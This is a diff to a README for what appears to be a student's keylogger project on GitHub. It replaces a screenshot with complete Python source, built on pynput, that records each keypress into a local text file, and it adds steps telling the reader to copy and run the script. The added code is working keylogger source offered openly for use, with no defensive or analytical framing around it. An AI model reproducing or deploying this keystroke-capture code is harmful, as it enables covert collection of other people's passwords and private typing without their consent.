@@ -19,7 +19,24 @@ As shown above, this is the text file in which is created as soon as the Keylogg
 <ins>How to create a Keylogger</ins> <br>
 1. Open a text file using pynput (for my project I used Visual Studio Code) otherwise the code will not run as intended <br>
 2. Copy the code below: <br>
-![Screenshot 2024-01-28 195831](https://github.com/mholtz15/Keylogger-Project/assets/157908872/a3cd7f82-af64-429a-a55a-e56b22796acd) <br>
-3. Run the code and make sure a text file is created when a user inputs their keystrokes. <br>
+```python
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt",'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Erro getting char")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input() 
+```
+<br>
+4. Run the code and make sure a text file is created when a user inputs their keystrokes. <br>
 <br>
 NOTE: If the code does not run, please double check that all commas, speech marks, colons etc are in the correct place and there is no more than needed to be as small errors such as this can equal into the code failing.
